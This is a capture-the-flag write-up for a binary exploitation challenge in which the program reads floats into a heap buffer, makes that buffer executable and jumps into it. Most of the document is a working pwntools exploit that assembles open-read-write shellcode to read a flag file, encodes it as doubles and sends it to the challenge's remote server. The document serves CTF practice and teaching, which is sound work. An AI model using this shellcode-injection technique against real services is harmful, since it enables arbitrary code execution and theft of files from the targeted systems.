**Description:** 
Drain your floats in style with higher precision!


Was provided with a binary file called `chall`

`file` and `checksec` output: 

```
➜  file chall
chall: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=19468a83b6cf568595bfdf4072b382b89e6166c4, for GNU/Linux 3.2.0, not stripped
```

```
➜  checksec --file=chall
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   53 Symbols	  No	0		0		chall
```

Decompilation: 
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+0h] [rbp-30h] BYREF
  int i; // [rsp+4h] [rbp-2Ch]
  unsigned __int64 v6; // [rsp+8h] [rbp-28h]
  size_t len; // [rsp+10h] [rbp-20h]
  void *addr; // [rsp+18h] [rbp-18h]
  unsigned __int64 v9; // [rsp+20h] [rbp-10h]
  unsigned __int64 v10; // [rsp+28h] [rbp-8h]

  v10 = __readfsqword(0x28u);
  setbuf(stdout, 0);
  setbuf(stdin, 0);
  setbuf(stderr, 0);
  puts("enter the number of floats you want to enter!");
  __isoc99_scanf("%d", &v4);
  if ( v4 > 100 )
  {
    puts("too much");
    exit(0);
  }
  v6 = (unsigned __int64)calloc(v4, 8u);
  if ( v6 )
  {
    for ( i = 0; i < v4; ++i )
      __isoc99_scanf("%lf", 8LL * i + v6);
    len = sysconf(30);
    addr = (void *)(-(__int64)len & v6);
    if ( mprotect(addr, len, 7) >= 0 )
    {
      enable_seccomp();
      puts("draining in progress...");
      v9 = v6;
      ((void (*)(void))v6)();
      return 0;
    }
    else
    {
      perror("mprotect");
      return 1;
    }
  }
  else
  {
    perror("calloc");
    return 1;
  }
}
```











`script.py`: 

```python
from pwn import *
import struct

context.arch = 'amd64'

# ORW shellcode to read flag
shellcode = asm('''
    /* open("flag", O_RDONLY) */
    xor rax, rax
    mov al, 2           /* syscall number for open */
    lea rdi, [rip+flag] /* pointer to "flag.txt" */
    xor rsi, rsi        /* O_RDONLY = 0 */
    xor rdx, rdx
    syscall
    
    /* read(fd, buf, 100) */
    mov rdi, rax        /* fd from open */
    xor rax, rax        /* syscall number for read */
    lea rsi, [rip+buf]  /* buffer to read into */
    mov dl, 100         /* count */
    syscall
    
    /* write(1, buf, rax) */
    mov rdx, rax        /* number of bytes read */
    mov rax, 1          /* syscall number for write */
    mov rdi, 1          /* stdout */
    lea rsi, [rip+buf]  /* buffer */
    syscall
    
    /* exit(0) */
    mov rax, 60
    xor rdi, rdi
    syscall
    
flag:
    .ascii "flag\\x00"
buf:
    .space 100
''')

def shellcode_to_doubles(sc):
    # Pad to multiple of 8
    while len(sc) % 8 != 0:
        sc += b"\x90"
    
    doubles = []
    for i in range(0, len(sc), 8):
        chunk = sc[i:i+8]
        double_val = struct.unpack('<d', chunk)[0]
        doubles.append(double_val)
    
    return doubles

# Convert shellcode to doubles
doubles = shellcode_to_doubles(shellcode)

p = remote('dancer.chals.nitectf25.live', 1337, ssl=True)
doubles = shellcode_to_doubles(shellcode)

# Send number of floats
p.sendline(str(len(doubles)).encode())
sleep(0.5)
for d in doubles:
    p.sendline(f"{d:.20e}".encode())

# Get output
p.interactive()
```